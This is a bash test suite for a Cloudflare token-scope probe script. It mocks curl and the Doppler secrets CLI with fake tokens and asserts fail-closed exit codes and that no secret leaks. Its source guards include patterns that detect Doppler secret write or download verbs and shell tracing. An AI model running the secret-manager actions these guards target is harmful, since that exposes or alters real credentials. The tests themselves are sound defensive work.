#!/usr/bin/env bash
# Test for cf-token-scope.sh — the deterministic three-layer fail-closed
# retained-scope probe (ADR-130 four-probe set + #6755/#6892).
#
# Stubs curl + doppler on PATH via a scratch bin dir; keeps real jq. Asserts:
#   - status layer (403/000/5xx/empty/no-newline/non-numeric = FAIL)
#   - body-shape layer: BOTH halves independently pinned —
#       {"success":true,"result":null}  = FAIL (null result)
#       {"success":false,"result":[]}   = FAIL (success false)
#   - per-scheme control layer (account 404 = FAIL; zone 404 trusted ONLY for the
#     verified phase http_config_settings, and only under an authorized control)
#   - --target-entrypoint: present-not-added, and the success line is gated on the
#     target probe actually passing (a denied/404 target => exit 3, no PASS line)
#   - --dry-run (token unexpanded, private-fd form, curl never run), token never
#     leaked to combined 2>&1, and source grep-guards with a positive anchor.
#
# Accumulate-then-exit style. All greps run against FILES (never a pipe) to avoid
# the pipefail + `grep -q` early-match SIGPIPE flake.
# HYGIENE MODEL (fix-round seats, stated honestly): the suite REQUIRES a bash
# where `VAR=x run …` prefix assignments are transient past the call (bash >=
# 5.2 behavior; not version-gated here — the D-block unsets are belt-and-braces
# for older shells). The C-block's mock specs are set the same prefix way and
# RELY on the assignment reaching the child for the call's duration; no C/D
# assertion relies on persistence beyond the call.
set -uo pipefail

TESTDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SUT="$TESTDIR/../skills/cf-token-scope/scripts/cf-token-scope.sh"
BASHBIN="$(command -v bash)"
JQBIN="$(command -v jq)"

pass=0
fail=0
ok() { pass=$((pass + 1)); printf 'ok   - %s\n' "$1"; }
no() { fail=$((fail + 1)); printf 'FAIL - %s\n' "$1"; }

WORK="$(mktemp -d -t cf-token-scope-test.XXXXXXXX)"
trap 'rm -rf "$WORK"' EXIT
OUTFILE="$WORK/out.txt"

# --- mock bin (curl + doppler + real jq); a second bin omits curl ---
MOCKBIN="$WORK/bin"
NOCURLBIN="$WORK/bin-nocurl"
mkdir -p "$MOCKBIN" "$NOCURLBIN"

cat >"$MOCKBIN/doppler" <<'EOF'
#!/usr/bin/env bash
# doppler secrets get <NAME> -p soleur -c prd_terraform --plain
name="$3"
[[ -n "${MOCK_DOPPLER_MARKER:-}" ]] && printf '%s\n' "$name" >>"$MOCK_DOPPLER_MARKER"
# _NEXT staging keys (migration profiles, --staged) resolve to "<base value>-next"
# unless MOCK_NEXT_MISSING names that key; MOCK_MISSING blanks one base key.
next=""
if [[ "$name" == *_NEXT ]]; then
  [[ "${MOCK_NEXT_MISSING:-}" == "$name" ]] && { printf ''; exit 0; }
  name="${name%_NEXT}"; next="-next"
fi
[[ -n "${MOCK_MISSING:-}" && "${MOCK_MISSING}" == "$name" ]] && { printf ''; exit 0; }
case "$name" in
  CF_API_TOKEN_RULESETS) v="${MOCK_TOKEN-fake-secret-abc123xyz}"; [[ -n "$v" ]] && printf '%s%s' "$v" "$next" ;;
  CF_API_TOKEN)          printf '%s%s' "${MOCK_API_TOKEN-default-token-xyz789}" "$next" ;;
  CF_API_TOKEN_PAGES)    printf '%s%s' "tok-pages-mock" "$next" ;;
  CF_API_TOKEN_ZONE_SETTINGS)  printf '%s%s' "tok-zonesettings-mock" "$next" ;;
  CF_API_TOKEN_BOT_MANAGEMENT) printf '%s%s' "tok-botmgmt-mock" "$next" ;;
  CF_ZONE_ID)            printf '%s' "${MOCK_ZONE-zone0123456789abcdef}" ;;
  CF_ACCOUNT_ID)         printf '%s' "${MOCK_ACCTID-acct9876543210fedcba}" ;;
  *)                     printf '' ;;
esac
EOF

cat >"$MOCKBIN/curl" <<'EOF'
#!/usr/bin/env bash
# Mock curl: emit "<body>\n<code>" to match the SUT's -w '\n%{http_code}'.
# Log positional URL operands and both --url forms across schemes, so an extra
# target cannot hide behind a canonical final argument. A spec of "NONE" emits
# nothing at all (models a total curl failure -> empty response, the no-newline path).
[[ -n "${MOCK_CURL_MARKER:-}" ]] && printf 'called\n' >>"$MOCK_CURL_MARKER"
# %q keeps multi-line arg values (the -w format) on ONE log line: retain the
# original argv before URL parsing shifts the positional parameters below.
[[ -n "${MOCK_CURL_ARGV:-}" ]] && printf '%q ' "$@" >>"$MOCK_CURL_ARGV" && printf '\n' >>"$MOCK_CURL_ARGV"
url=""
method="GET"
body_arg=""
tok=""
record_url() {
  url="$1"
  [[ -n "${MOCK_CURL_URLLOG:-}" ]] && printf '%s\n' "$url" >>"$MOCK_CURL_URLLOG"
}
while [[ $# -gt 0 ]]; do
  case "$1" in
    --url)
      shift
      [[ $# -gt 0 ]] && record_url "$1"
      ;;
    --url=*) record_url "${1#*=}" ;;
    --proxy|--proxy1.0|--preproxy|--socks4|--socks4a|--socks5|--socks5-hostname|-x|-sSx) shift ;;
    --proxy=*|--proxy1.0=*|--preproxy=*|--socks4=*|--socks4a=*|--socks5=*|--socks5-hostname=*|-x*|-sSx*) ;;
    --max-time|-w|--noproxy) shift ;;
    -H)
      shift
      # The SUT passes the bearer as `-H @/dev/fd/N`; read it so the mock can
      # answer per token (the migration profiles' deny/grant pairs).
      if [[ "${1:-}" == @* ]]; then
        hdr="$(cat "${1#@}" 2>/dev/null || true)"
        [[ "$hdr" == "Authorization: Bearer "* ]] && tok="${hdr#Authorization: Bearer }"
      fi
      ;;
    -X) shift; method="${1:-}" ;;
    --data-binary) shift; body_arg="${1:-}" ;;
    --disable|-sS) ;;
    # Any flag this mock does not model is a refusal, never a silent GET: an
    # unmodelled spelling (-XDELETE, -d@file, --data-raw, -K) would otherwise be
    # answered as if it were a read. The suite asserts this log stays empty.
    -*)
      [[ -n "${MOCK_CURL_UNMODELLED:-}" ]] && { printf 'UNMODELLED'; printf ' %q' "$@"; printf '\n'; } >>"$MOCK_CURL_UNMODELLED"
      exit 64
      ;;
    *) record_url "$1" ;;
  esac
  shift
done
# Real CF shapes: a zone .../entrypoint returns a single ruleset OBJECT; the
# account /rulesets list returns an ARRAY. The mock must mirror this so the
# per-scheme body-shape check is exercised against the true contract (#6892 QA).
ZONE_AUTH='200:{"success":true,"result":{"id":"r","kind":"zone","phase":"p","rules":[]}}'
ACCT_AUTH='200:{"success":true,"result":[]}'
# WRITE requests (migration profiles). Logged as "METHOD URL TOKEN BODY". The
# default answer models Cloudflare: a token that holds the URL's scope gets 400
# for the invalid body, any other token 403. MOCK_WRITE_OVERRIDE is a file of
# "<url-regex>|<token>|<code>:<body>" lines; the first match wins.
if [[ "$method" != "GET" ]]; then
  [[ -n "${MOCK_WRITE_LOG:-}" ]] && printf '%s %s %s %s\n' "$method" "$url" "$tok" "$body_arg" >>"$MOCK_WRITE_LOG"
  spec=""
  if [[ -n "${MOCK_WRITE_OVERRIDE:-}" && -f "${MOCK_WRITE_OVERRIDE}" ]]; then
    while IFS='|' read -r o_re o_tok o_spec; do
      [[ -n "$o_re" ]] || continue
      if [[ "$url" =~ $o_re && "$tok" == "$o_tok" ]]; then spec="$o_spec"; break; fi
    done <"$MOCK_WRITE_OVERRIDE"
  fi
  if [[ -z "$spec" ]]; then
    base_tok="${tok%-next}"
    granted=0
    case "$base_tok" in
      fake-secret-abc123xyz) [[ "$url" =~ /rulesets/phases/|/rules/lists$ ]] && granted=1 ;;
      default-token-xyz789)  [[ "$url" =~ /dns_records$ ]] && granted=1 ;;
      tok-pages-mock)        [[ "$url" =~ /pages/projects$ ]] && granted=1 ;;
      tok-zonesettings-mock) [[ "$url" =~ /zones/[^/]+/settings$ ]] && granted=1 ;;
      tok-botmgmt-mock)      [[ "$url" =~ /bot_management$ ]] && granted=1 ;;
    esac
    if [[ "$granted" == 1 ]]; then spec='400:{"success":false,"errors":[{"code":10026,"message":"invalid json"}]}'
    else spec='403:{"success":false,"errors":[{"code":10000,"message":"Authentication error"}]}'; fi
  fi
  printf '%s\n%s' "${spec#*:}" "${spec%%:*}"
  exit 0
fi
[[ -n "${MOCK_GET_LOG:-}" ]] && printf 'GET %s %s\n' "$url" "$tok" >>"$MOCK_GET_LOG"
if [[ "$url" =~ ^https://api\.cloudflare\.com/client/v4/accounts/[^/]+/alerting/v3/policies$ ]]; then
  spec="${MOCK_NOTIF:-$ACCT_AUTH}"
else
case "$url" in
  *http_config_settings*)          spec="${MOCK_CONFIG:-$ZONE_AUTH}" ;;
  *http_request_dynamic_redirect*) spec="${MOCK_DYNREDIR:-$ZONE_AUTH}" ;;
  *http_request_cache_settings*)   spec="${MOCK_CACHE:-$ZONE_AUTH}" ;;
  *http_request_firewall_custom*)  spec="${MOCK_WAF:-$ZONE_AUTH}" ;;
  *http_request_transform*)        spec="${MOCK_TARGET:-$ZONE_AUTH}" ;;
  # default-token profile rows (D-series). Authorized default is the ARRAY shape —
  # every new endpoint returns a list. ORDERING IS LOAD-BEARING: the pools URL is a
  # superstring of the zone-LB match, so pools must precede *load_balancers*.
  *cfd_tunnel*)                    spec="${MOCK_TUNNEL:-$ACCT_AUTH}" ;;
  *access/apps*)                   spec="${MOCK_ACCESS:-$ACCT_AUTH}" ;;
  *dns_records*)                   spec="${MOCK_DNS:-$ACCT_AUTH}" ;;
  */settings)                      spec="${MOCK_ZSET:-$ACCT_AUTH}" ;;
  *load_balancers/pools*)          spec="${MOCK_LB_POOLS:-$ACCT_AUTH}" ;;
  *load_balancers*)                spec="${MOCK_LB_ZONE:-$ACCT_AUTH}" ;;
  */rulesets)                      spec="${MOCK_ACCT:-$ACCT_AUTH}" ;;
  *)                               spec="${MOCK_OTHER:-$ZONE_AUTH}" ;;
esac
fi
[[ "$spec" == "NONE" ]] && exit 0   # no output at all
code="${spec%%:*}"
body="${spec#*:}"
printf '%s\n%s' "$body" "$code"
EOF

chmod +x "$MOCKBIN/doppler" "$MOCKBIN/curl"
ln -sf "$JQBIN" "$MOCKBIN/jq"
# no-curl bin: doppler + jq only (to exercise the missing-prereq path). Nothing
# external runs before the prereq check, so this bare PATH is sufficient.
cp "$MOCKBIN/doppler" "$NOCURLBIN/doppler"
ln -sf "$JQBIN" "$NOCURLBIN/jq"

# Mock dir FIRST (shadows real curl/doppler), then system bins so the SUT's `cat`
# (usage) and the mock shebangs (/usr/bin/env bash) still resolve.
MOCKPATH="$MOCKBIN:/usr/bin:/bin"
# Every SUT run inherits this: the curl mock appends "UNMODELLED <args>" and exits
# 64 for any flag it does not model. Asserted empty at the end of the suite (U1).
export MOCK_CURL_UNMODELLED="$WORK/curl-unmodelled.log"
: >"$MOCK_CURL_UNMODELLED"

# run <PATH> <args...> ; sets RC and writes combined output to OUTFILE.
run() {
  local path="$1"
  shift
  PATH="$path" "$BASHBIN" "$SUT" "$@" >"$OUTFILE" 2>&1
  RC=$?
}

assert_rc() { if [[ "$RC" == "$1" ]]; then ok "$2"; else no "$2 (want rc=$1 got $RC)"; fi; }
has() { if grep -qF -- "$1" "$OUTFILE"; then ok "$2"; else no "$2 (missing: $1)"; fi; }
lacks() { if grep -qF -- "$1" "$OUTFILE"; then no "$2 (present: $1)"; else ok "$2"; fi; }
# refute / require a literal in the SUT source (grep on a FILE, never a pipe).
src_lacks() { if grep -qE -- "$1" "$SUT"; then no "$2"; else ok "$2"; fi; }
src_has() { if grep -qE -- "$1" "$SUT"; then ok "$2"; else no "$2 (missing anchor: $1)"; fi; }

# --- C1: all authorized + target authorized -> exit 0, "present" line ---
run "$MOCKPATH" --target-entrypoint http_request_transform
assert_rc 0 "C1 all-authorized + target -> exit 0"
has "PASS: no scope dropped" "C1 prints 'no scope dropped'"
has "PASS: target scope present" "C1 prints 'target scope present'"

# --- C2: a retained zone phase (cache) at 403 -> exit 3, no pass line ---
MOCK_CACHE='403:{"success":false,"errors":[{"code":10000}]}' run "$MOCKPATH"
assert_rc 3 "C2 retained phase 403 -> exit 3"
lacks "PASS: no scope dropped" "C2 omits 'no scope dropped'"

# --- C2b: the newly-probed Zone WAF phase at 403 -> exit 3 (drop detected) ---
MOCK_WAF='403:{"success":false}' run "$MOCKPATH"
assert_rc 3 "C2b Zone WAF (firewall_custom) 403 -> exit 3"

# --- C3: degraded 200 {"success":false,"result":null} -> exit 3 ---
MOCK_CACHE='200:{"success":false,"result":null}' run "$MOCKPATH"
assert_rc 3 "C3 degraded 200 (both false) -> exit 3"
lacks "PASS: no scope dropped" "C3 omits 'no scope dropped'"

# --- C3a: {"success":true,"result":null} -> exit 3 (pins the .result-type half;
#          this is the exact fail-open CF degraded shape the SUT exists to catch) ---
MOCK_CACHE='200:{"success":true,"result":null}' run "$MOCKPATH"
assert_rc 3 "C3a degraded 200 (result null, success true) -> exit 3"

# --- C3c: a ZONE entrypoint returning an ARRAY result -> exit 3. Zone entrypoints
#          return a single ruleset OBJECT; an array is the wrong per-scheme shape.
#          (Regression for the #6892 QA bug: the classifier once required an array
#          for ALL probes, which rejected every real authorized zone 200.) ---
MOCK_CACHE='200:{"success":true,"result":[]}' run "$MOCKPATH"
assert_rc 3 "C3c zone 200 with array result (wrong scheme shape) -> exit 3"

# --- C3d: the ACCOUNT list returning an OBJECT result -> exit 3 (account expects
#          an array; the per-scheme type must hold in the account direction too) ---
MOCK_ACCT='200:{"success":true,"result":{"id":"x"}}' run "$MOCKPATH"
assert_rc 3 "C3d account 200 with object result (wrong scheme shape) -> exit 3"

# --- C3b: {"success":false,"result":[]} -> exit 3 (pins the success==true half) ---
MOCK_CACHE='200:{"success":false,"result":[]}' run "$MOCKPATH"
assert_rc 3 "C3b degraded 200 (success false, result array) -> exit 3"

# --- C4: account-scheme 404 -> exit 3 (account list is its own control) ---
MOCK_ACCT='404:{"success":false}' run "$MOCKPATH"
assert_rc 3 "C4 account 404 -> exit 3"

# --- C5a: a 404 on the VERIFIED phase (http_config_settings) under an authorized
#          control -> PASS (ADR-130: 403-on-missing verified there) ---
MOCK_CONFIG='404:{"success":false,"errors":[]}' run "$MOCKPATH"
assert_rc 0 "C5a verified-phase 404 under authorized control -> exit 0"
has "PASS: no scope dropped" "C5a prints 'no scope dropped'"

# --- C5c: a 404 on an UNVERIFIED retained phase (cache) under an authorized
#          control -> FAIL (fail-closed; 403-on-missing unverified there) ---
MOCK_CACHE='404:{"success":false}' run "$MOCKPATH"
assert_rc 3 "C5c unverified-phase 404 under authorized control -> exit 3 (fail-closed)"

# --- C5b: verified-phase 404 while the zone control is degraded -> exit 3 ---
MOCK_CONFIG='404:{"success":false}' MOCK_DYNREDIR='200:{"success":false,"result":null}' run "$MOCKPATH"
assert_rc 3 "C5b verified 404 + degraded control -> exit 3"

# --- C6: status-layer failures ---
MOCK_CONFIG='000:' run "$MOCKPATH"
assert_rc 3 "C6a network 000 -> exit 3"
MOCK_CACHE='500:{}' run "$MOCKPATH"
assert_rc 3 "C6b http 500 -> exit 3"
MOCK_CONFIG='NONE' run "$MOCKPATH"
assert_rc 3 "C6c empty/no-newline response -> exit 3"
MOCK_CONFIG='xyz:{}' run "$MOCKPATH"
assert_rc 3 "C6d non-numeric status code -> exit 3"

# --- C7: negative target — a denied target must exit 3 AND omit the PASS line
#          (the success line is gated on the target probe actually passing) ---
MOCK_TARGET='403:{"success":false}' run "$MOCKPATH" --target-entrypoint http_request_transform
assert_rc 3 "C7 denied target -> exit 3"
lacks "PASS: target scope present" "C7 denied target omits 'target scope present'"

# --- C7a: a target 404 on an UNVERIFIED phase -> exit 3 (cannot confirm the add) ---
MOCK_TARGET='404:{"success":false}' run "$MOCKPATH" --target-entrypoint http_request_transform
assert_rc 3 "C7a unverified target 404 -> exit 3"

# --- C7b: a target 404 on the VERIFIED phase http_config_settings -> exit 0
#          (a fresh widen may leave the phase empty; 404 is trusted there) ---
MOCK_CONFIG='404:{"success":false}' run "$MOCKPATH" --target-entrypoint http_config_settings
assert_rc 0 "C7b verified target 404 -> exit 0"
has "PASS: target scope present (http_config_settings)" "C7b verified target 404 prints present"

# --- C8: --dry-run prints the private-fd recipe with token unexpanded, no curl ---
MARKER="$WORK/curl-called"
MOCK_CURL_MARKER="$MARKER" run "$MOCKPATH" --dry-run
assert_rc 0 "C8 --dry-run -> exit 0"
# shellcheck disable=SC2016  # the literal, unexpanded '$TOK' is exactly the assertion
has '"$TOK"' "C8 dry-run keeps the token var unexpanded"
has "printf 'Authorization: Bearer %s'" "C8 dry-run models the private-fd form, not inline -H"
lacks "fake-secret-abc123xyz" "C8 dry-run leaks no token value"
if [[ ! -e "$MARKER" ]]; then ok "C8 dry-run never invoked curl"; else no "C8 dry-run invoked curl"; fi

# --- C9: a real run never echoes the token value (combined 2>&1) ---
run "$MOCKPATH"
assert_rc 0 "C9 baseline authorized run -> exit 0"
lacks "fake-secret-abc123xyz" "C9 no Bearer token value in combined output"

# --- C10: source grep-guards (negatives enforced) + a positive anchor so the
#          guards cannot pass vacuously on a missing/empty SUT ---
src_has 'set -euo pipefail' "C10 positive anchor present (non-vacuous guards)"
src_lacks 'set +(-x|.*xtrace)' "C10 no shell trace (set -x / xtrace) in source"
src_lacks 'doppler[[:space:]]+(secrets[[:space:]]+)?(set|upload|download|delete)\b' "C10 no Doppler write verb in source"
src_lacks '\bterraform\b' "C10 no 'terraform' in source"

# --- C11: missing Doppler secret -> exit 2 ---
MOCK_TOKEN='' run "$MOCKPATH"
assert_rc 2 "C11 empty token secret -> exit 2"

# --- C12: missing curl prereq -> exit 2 ---
run "$NOCURLBIN"
assert_rc 2 "C12 missing curl binary -> exit 2"

# --- C13: --target-entrypoint with no value -> exit 2 (usage error) ---
run "$MOCKPATH" --target-entrypoint
assert_rc 2 "C13 --target-entrypoint missing value -> exit 2"

# --- C14: --help -> exit 0 ---
run "$MOCKPATH" --help
assert_rc 0 "C14 --help -> exit 0"

# ============================================================================
# D-series — default-token profile (plan 2026-10-28-feat-cf-token-scope-...;
# written RED-first per cq-write-failing-tests-before). C1–C14 above are the
# D13 back-compat pin (run before and after the script phase, unmodified).
# ============================================================================

# stdout-only capture for the channel-sensitive rows (plan addendum 1/16: the
# assert-mode FAIL verdict moved to stdout — same #7797 rationale as the xtrace
# refusal; the merged run() capture cannot pin a channel, this one can).
run_out() {
  local path="$1"
  shift
  PATH="$path" "$BASHBIN" "$SUT" "$@" >"$OUTFILE" 2>"$WORK/err.txt"
  RC=$?
}
has_re() { if grep -qE -- "$1" "$OUTFILE"; then ok "$2"; else no "$2 (no match: $1)"; fi }
has_err() { if grep -qF -- "$1" "$WORK/err.txt"; then ok "$2"; else no "$2 (missing on stderr: $1)"; fi }
lacks_err() { if grep -qF -- "$1" "$WORK/err.txt"; then no "$2 (present on stderr: $1)"; else ok "$2"; fi }
count_f() { grep -cF -- "$1" "$OUTFILE" || true; }
assert_eq() { if [[ "$2" == "$3" ]]; then ok "$1"; else no "$1 (want $2 got $3)"; fi }

SKILLDOC="$TESTDIR/../skills/cf-token-scope/SKILL.md"
PLAYBOOK="$TESTDIR/../skills/cf-token-scope/references/widen-playbook.md"
DOPREQ="$WORK/doppler-requests.log"

# --- D1: default-token dry-run binds CF_API_TOKEN and prints all six rows ---
DM1="$WORK/d1-curl-marker"
MOCK_CURL_MARKER="$DM1" run "$MOCKPATH" --profile default-token --dry-run
assert_rc 0 "D1 default-token dry-run -> exit 0"
has "doppler secrets get CF_API_TOKEN " "D1 dry-run resolves the token secret to CF_API_TOKEN"
for u in cfd_tunnel access/apps dns_records alerting/v3/policies "load_balancers/pools" 'zones/$ZONE/load_balancers'; do
  has "$u" "D1 dry-run prints the $u row"
done
D1_EXPECTED_NOTIF_URL="https://api.cloudflare.com/client/v4/accounts/\$ACCT/alerting/v3/policies"
D1_EXPECTED_NOTIF_RECIPE="curl --disable --noproxy '*' -sS --max-time 15 -H @<(printf 'Authorization: Bearer %s' \"\$TOK\") $D1_EXPECTED_NOTIF_URL"
D1_NOTIF_RECIPE_COUNT=$(grep -Fc -- "$D1_EXPECTED_NOTIF_URL" "$OUTFILE" || true)
if [[ "$D1_NOTIF_RECIPE_COUNT" == "1" ]] && grep -Fxq -- "$D1_EXPECTED_NOTIF_RECIPE" "$OUTFILE"; then
  ok "D1 dry-run prints exactly one Notifications URL with no query or suffix"
else
  no "D1 dry-run Notifications recipe is not the exact documented URL"
fi
src_lacks 'notification_policies' "D1 source no longer contains the legacy Notifications route"
# shellcheck disable=SC2016  # the literal, unexpanded '$TOK' is exactly the assertion
has '"$TOK"' "D1 dry-run keeps the token var unexpanded"
has "printf 'Authorization: Bearer %s'" "D1 dry-run models the private-fd form"
lacks "default-token-xyz789" "D1 dry-run leaks no token value"
if [[ ! -e "$DM1" ]]; then ok "D1 dry-run never invoked curl"; else no "D1 dry-run invoked curl"; fi

# --- D1b: binding pin (Guard 1 M1/M5 detector): this profile must NOT touch the
#          rulesets secret name anywhere. ---
lacks "CF_API_TOKEN_RULESETS" "D1b default-token dry-run never names the rulesets secret"

# --- D1H: Guard 1 H2 (must-PASS, non-canonical): dry-run precedes the prereq
#          loop — the NOCURLBIN PATH (no curl; doppler+jq still present) still
#          exits 0. A suite that only passes with mocks present is over-fitted. ---
run "$NOCURLBIN" --profile default-token --dry-run
assert_rc 0 "D1H default-token dry-run under no-curl PATH -> exit 0 (print/run parity, not mock-overfitted)"

# --- D2: baseline with both LB rows 403 -> exit-neutral not-yet-widened, BOTH
#         rows asserted per-label (Guard 2 M3: no first-member-only pass). ---
D2MARK="$WORK/d2-doppler-requests"
D2URLS="$WORK/d2-curl-urls"
: >"$D2MARK"
LB403='403:{"success":false,"errors":[{"code":10000}]}'
TUNNEL_URL='https://api.cloudflare.com/client/v4/accounts/acct9876543210fedcba/cfd_tunnel?per_page=1'
ACCESS_URL='https://api.cloudflare.com/client/v4/accounts/acct9876543210fedcba/access/apps?per_page=1'
DNS_URL='https://api.cloudflare.com/client/v4/zones/zone0123456789abcdef/dns_records?per_page=1'
NOTIF_URL='https://api.cloudflare.com/client/v4/accounts/acct9876543210fedcba/alerting/v3/policies'
LB_POOLS_URL='https://api.cloudflare.com/client/v4/accounts/acct9876543210fedcba/load_balancers/pools?per_page=1'
LB_ZONE_URL='https://api.cloudflare.com/client/v4/zones/zone0123456789abcdef/load_balancers?per_page=1'
# Directly exercise the mock's negative route boundary; broadening its matcher
# must not let a suffixed path or query receive the Notifications success fixture.
PATH="$MOCKPATH" MOCK_NOTIF='200:{"success":true,"result":[]}' MOCK_OTHER='418:{"success":false}' \
  "$MOCKBIN/curl" "$NOTIF_URL/extra" >"$OUTFILE"
if grep -Fxq -- '418' "$OUTFILE"; then
  ok "D2 mock dispatch rejects a suffixed Notifications URL"
else
  no "D2 mock dispatch accepted a suffixed Notifications URL"
fi
PATH="$MOCKPATH" MOCK_NOTIF='200:{"success":true,"result":[]}' MOCK_OTHER='418:{"success":false}' \
  "$MOCKBIN/curl" "$NOTIF_URL?per_page=1" >"$OUTFILE"
if grep -Fxq -- '418' "$OUTFILE"; then
  ok "D2 mock dispatch rejects a Notifications query suffix"
else
  no "D2 mock dispatch accepted a Notifications query suffix"
fi
D2_OPERAND_LOG="$WORK/d2-curl-operands"
PATH="$MOCKPATH" MOCK_CURL_URLLOG="$D2_OPERAND_LOG" MOCK_NOTIF='200:{"success":true,"result":[]}' \
  "$MOCKBIN/curl" --url=http://example.invalid --url 'ftp://example.invalid/path' "$NOTIF_URL" >"$OUTFILE"
if [[ "$(wc -l < "$D2_OPERAND_LOG" | tr -d '[:space:]')" == "3" ]] \
   && grep -Fxq -- 'http://example.invalid' "$D2_OPERAND_LOG" \
   && grep -Fxq -- 'ftp://example.invalid/path' "$D2_OPERAND_LOG" \
   && grep -Fxq -- "$NOTIF_URL" "$D2_OPERAND_LOG"; then
  ok "D2 mock observer records --url=, --url, and positional targets across schemes"
else
  no "D2 mock observer missed or altered a URL operand"
fi
D2_PROXY_LOG="$WORK/d2-proxy-operand-log"
assert_proxy_only_falls_through() {
  local label="$1"
  shift
  : >"$D2_PROXY_LOG"
  PATH="$MOCKPATH" MOCK_CURL_URLLOG="$D2_PROXY_LOG" MOCK_NOTIF='200:{"success":true,"result":[]}' MOCK_OTHER='418:{"success":false}' \
    "$MOCKBIN/curl" "$@" >"$OUTFILE"
  if [[ ! -s "$D2_PROXY_LOG" ]] && grep -Fxq -- '418' "$OUTFILE"; then
    ok "$label"
  else
    no "$label"
  fi
}
assert_proxy_only_falls_through "D2 --proxy= value is not a transfer URL" "--proxy=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --proxy value is not a transfer URL" --proxy "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --proxy1.0= value is not a transfer URL" "--proxy1.0=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --proxy1.0 value is not a transfer URL" --proxy1.0 "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --preproxy= value is not a transfer URL" "--preproxy=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --preproxy value is not a transfer URL" --preproxy "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --socks4= value is not a transfer URL" "--socks4=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --socks4 value is not a transfer URL" --socks4 "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --socks4a= value is not a transfer URL" "--socks4a=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --socks4a value is not a transfer URL" --socks4a "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --socks5= value is not a transfer URL" "--socks5=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --socks5 value is not a transfer URL" --socks5 "$NOTIF_URL"
assert_proxy_only_falls_through "D2 --socks5-hostname= value is not a transfer URL" "--socks5-hostname=$NOTIF_URL"
assert_proxy_only_falls_through "D2 separated --socks5-hostname value is not a transfer URL" --socks5-hostname "$NOTIF_URL"
assert_proxy_only_falls_through "D2 -x value is not a transfer URL" -x "$NOTIF_URL"
assert_proxy_only_falls_through "D2 attached -x value is not a transfer URL" "-x$NOTIF_URL"
assert_proxy_only_falls_through "D2 clustered -sSx value is not a transfer URL" -sSx "$NOTIF_URL"
assert_proxy_only_falls_through "D2 attached clustered -sSx value is not a transfer URL" "-sSx$NOTIF_URL"
D2_MIXED_PROXY_LOG="$WORK/d2-proxy-with-transfer-target"
assert_proxy_with_target() {
  local label="$1"
  shift
  : >"$D2_MIXED_PROXY_LOG"
  PATH="$MOCKPATH" MOCK_CURL_URLLOG="$D2_MIXED_PROXY_LOG" MOCK_NOTIF='200:{"success":true,"result":[]}' MOCK_TUNNEL='418:{"success":false}' \
    "$MOCKBIN/curl" "$@" "$TUNNEL_URL" >"$OUTFILE"
  if [[ "$(wc -l < "$D2_MIXED_PROXY_LOG" | tr -d '[:space:]')" == "1" ]] \
     && grep -Fxq -- "$TUNNEL_URL" "$D2_MIXED_PROXY_LOG" \
     && ! grep -Fxq -- "$NOTIF_URL" "$D2_MIXED_PROXY_LOG" \
     && grep -Fxq -- '418' "$OUTFILE"; then
    ok "$label"
  else
    no "$label"
  fi
}
assert_proxy_with_target "D2 --proxy separated beside real target logs only transfer URL" --proxy "$NOTIF_URL"
assert_proxy_with_target "D2 --proxy= beside real target logs only transfer URL" "--proxy=$NOTIF_URL"
assert_proxy_with_target "D2 --proxy1.0 separated beside real target logs only transfer URL" --proxy1.0 "$NOTIF_URL"
assert_proxy_with_target "D2 --proxy1.0= beside real target logs only transfer URL" "--proxy1.0=$NOTIF_URL"
assert_proxy_with_target "D2 --preproxy separated beside real target logs only transfer URL" --preproxy "$NOTIF_URL"
assert_proxy_with_target "D2 --preproxy= beside real target logs only transfer URL" "--preproxy=$NOTIF_URL"
assert_proxy_with_target "D2 --socks4 separated beside real target logs only transfer URL" --socks4 "$NOTIF_URL"
assert_proxy_with_target "D2 --socks4= beside real target logs only transfer URL" "--socks4=$NOTIF_URL"
assert_proxy_with_target "D2 --socks4a separated beside real target logs only transfer URL" --socks4a "$NOTIF_URL"
assert_proxy_with_target "D2 --socks4a= beside real target logs only transfer URL" "--socks4a=$NOTIF_URL"
assert_proxy_with_target "D2 --socks5 separated beside real target logs only transfer URL" --socks5 "$NOTIF_URL"
assert_proxy_with_target "D2 --socks5= beside real target logs only transfer URL" "--socks5=$NOTIF_URL"
assert_proxy_with_target "D2 --socks5-hostname separated beside real target logs only transfer URL" --socks5-hostname "$NOTIF_URL"
assert_proxy_with_target "D2 --socks5-hostname= beside real target logs only transfer URL" "--socks5-hostname=$NOTIF_URL"
assert_proxy_with_target "D2 -x separated beside real target logs only transfer URL" -x "$NOTIF_URL"
assert_proxy_with_target "D2 -x attached beside real target logs only transfer URL" "-x$NOTIF_URL"
assert_proxy_with_target "D2 -sSx separated beside real target logs only transfer URL" -sSx "$NOTIF_URL"
assert_proxy_with_target "D2 -sSx attached beside real target logs only transfer URL" "-sSx$NOTIF_URL"
MOCK_DOPPLER_MARKER="$D2MARK" MOCK_CURL_URLLOG="$D2URLS" MOCK_NOTIF='200:{"success":true,"result":[{"id":"synthetic-policy-id"}]}' MOCK_LB_POOLS="$LB403" MOCK_LB_ZONE="$LB403" run "$MOCKPATH" --profile default-token
assert_rc 0 "D2 baseline LB 403s are exit-neutral -> exit 0"
# RUN-PATH URL ASSEMBLY pin (design-pass P2): inspect the actual request URLs,
# not only the mock's response, so wrong IDs, suffixes, or path/query drift red.
if [[ -s "$D2URLS" ]] \
   && grep -Fxq -- "$TUNNEL_URL" "$D2URLS" \
   && grep -Fxq -- "$ACCESS_URL" "$D2URLS" \
   && grep -Fxq -- "$DNS_URL" "$D2URLS" \
    && grep -Fxq -- "$NOTIF_URL" "$D2URLS" \
   && grep -Fxq -- "$LB_POOLS_URL" "$D2URLS" \
   && grep -Fxq -- "$LB_ZONE_URL" "$D2URLS" \
    && ! grep -qF -- '/notification_policies' "$D2URLS" \
    && ! grep -q '\$ZONE\|\$ACCT' "$D2URLS"; then
  ok "D2 all six run-path URLs are exact; Notifications has no legacy route or query suffix"
else
  no "D2 run-path URL assembly or profile route is wrong (see $D2URLS)"
fi
